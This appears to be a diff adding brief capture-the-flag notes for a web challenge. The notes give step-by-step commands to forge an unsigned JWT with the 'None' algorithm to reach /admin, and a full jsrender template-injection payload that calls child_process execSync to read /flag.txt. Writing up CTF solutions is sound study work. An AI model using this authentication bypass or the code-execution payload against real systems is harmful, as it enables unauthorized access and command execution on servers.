@@ -1,0 +1,10 @@
+==Generate Custom JWT Token
+-echo -n '{"alg":"None","typ":"JWT"}' | base64
+-echo -n '{"id":1,"iat":1679234493,"exp":1679238093}' | base64
+-Then concatenate the first base64 part with the second with . as separator and place . at the end (base64.base64.)
+-Create cookies with name = session
+-Navigate to /admin
+==jsrender SSTI
+-Because the username of registered user is rendered to the web using jsrender, we can inject payload at username when registering a new account
+-Payload = "{{:\"bsb\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}}"
+-Refresh /admin
